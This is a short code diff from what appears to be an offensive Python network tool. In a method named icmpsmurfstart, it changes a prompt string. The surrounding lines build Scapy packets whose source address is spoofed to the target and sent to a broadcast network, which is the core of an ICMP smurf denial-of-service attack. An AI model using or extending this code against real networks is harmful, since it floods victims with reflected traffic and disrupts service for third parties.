@@ -121,7 +121,7 @@ class Jam(object):
 
 	def icmpsmurfstart(self, tgt):
 		try:
-			broadcast = raw_input("[+] Broadcast network address: ")
+			broadcast = raw_input("[+] Address/Network to send echo-requests: ")
 			IP_layer = IP(src=tgt,dst=broadcast)
 			ICMP_layer = ICMP()
 			pkt = IP_layer/ICMP_layer
